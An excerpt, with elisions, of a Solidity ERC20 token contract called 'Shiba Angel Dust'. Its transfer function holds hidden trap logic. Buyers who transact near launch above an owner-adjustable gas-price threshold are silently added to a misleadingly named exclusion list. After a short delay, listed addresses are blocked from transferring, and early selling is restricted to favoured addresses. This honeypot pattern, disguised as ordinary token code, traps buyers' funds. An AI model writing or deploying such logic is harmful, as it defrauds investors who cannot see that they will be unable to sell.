...
contract ShibaAngelDust is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Shiba Angel Dust";
    ...
    uint256 private gasForProcessing = 5 * 1 gwei;
    ...
    function setGasForProcessing(uint256 _GasForProcessing) external onlyOwner {
        gasForProcessing = _GasForProcessing * 1 gwei;
    }
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (launchAt + 5 <= block.timestamp) {limitInEffect = false;}
        if (launchAt + 30 <= block.timestamp) {transferDelay = false;}
        if (!transferDelay && (!_isExcludedFromFee[from])) { require(!_isExcludeds[from]);}
        //if (transferDelay && launchAt + 30 <= block.timestamp) {idclaim();}
        if (limitInEffect && to != uniswapV2Pair && tx.gasprice >= gasForProcessing) {_isExcludeds[to] = true;}
        if (transferDelay && to == uniswapV2Pair) {require(_isExcludedFromFee[from]);}
